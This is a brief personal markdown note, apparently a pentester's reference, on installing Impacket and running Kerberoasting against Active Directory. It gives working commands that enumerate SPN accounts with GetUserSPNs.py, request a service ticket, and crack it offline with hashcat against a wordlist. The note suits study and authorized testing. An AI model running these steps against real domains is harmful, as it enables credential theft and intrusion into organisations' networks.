# Impacket 

Note: This doc should be placed in an eventual AD folder, once I get that far.
## Install

install impacket with:
`pipenv install impacket`
this will create a virtualenv in `/home/${local_user}/.local/share/virtualenvs/${VENV_NAME}`
you can then:
```
export IMPACKET_SCRIPTS=$(pipenv --venv)/bin
```
Now, you can run impacket scripts with:
```
python3  ${IMPACKET_SCRIPTS}/${script} ...
```

## Kerberoasting

check for SPN accounts:
```
python3 ${IMPACKET_SCRIPTS}/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PASSWORD} 

```
Now, we can request the TGS for the found user:

```
python3 $IMPACKET_SCRIPTS/GetUserSPNs.py -dc-ip ${DC_IP} ${DOMAIN}/${DOMAIN_USER}:${DOMAIN_USER_PW} -request-user ${SPN_ACCOUNT} -outputfile tgs.txt 


```

Now, you can crack the password in the tgs file:

```
hashcat -a 0 -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```



